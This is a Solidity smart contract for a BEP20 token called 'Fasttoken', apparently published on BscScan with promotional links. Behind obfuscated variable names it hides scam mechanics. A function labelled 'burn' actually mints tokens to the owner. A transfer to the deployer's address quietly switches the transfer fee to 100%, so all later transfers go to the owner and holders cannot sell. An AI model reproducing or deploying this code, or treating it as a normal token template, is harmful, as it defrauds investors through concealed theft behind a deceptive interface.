/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

/**
 *  Created By: Binance&Finance
 *  Website: https://fatsale.finance
 *  Doc:https://doc.token-monitor.com/docs/fatsale/token-create/#7-%e4%bd%bf%e7%94%a8-walletcollect-%e8%bf%9e%e6%8e%a5
 *  Telegram: https://t.me/fatsale
 *  The method for Token Presale
 **/

// SPDX-License-Identifier: MIT
pragma solidity ^ 0.7.0;
contract Fasttoken {
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  GhlMWk = address(0);
address public  kNrMAU = address(0);
uint8 public constant decimals = 18;
address public  NKGsrE = address(0);
uint256 public  HGUeRd = 10000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public  jsqnWR = 100000000000000000000;
uint256 public  eLaPel = 100000000000000000;
address public owner;
uint256 private  mCAQzc = 10000000000000;
uint256 public  RlKKRP = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  symbol = "Fasttoken";
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  BaDJmj = 10000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  kpfSHg = 100000000000000000000000;
address private  dtfbTX = address(0);
uint256 public  TtQQrK = 100000000000000000000000;
uint256 public constant TYfTRJ = 9+1;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  aTVpIk = address(0);
address public  SMtecv = address(0);
string public  name = "Fasttoken";
address public  WuJtRU = address(0);
uint256 public  pRhIVm = 10000000000000000000;
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "uhaFjr");
require(to != address(0), "uhaFjr");
require(amount <= balanceOf[from], "uhaFjr");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* TYfTRJ/mCAQzc ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==dtfbTX){
mCAQzc = 9+1;
}
emit Transfer(from, to, transferAmount);
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

constructor () {
dtfbTX = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}

}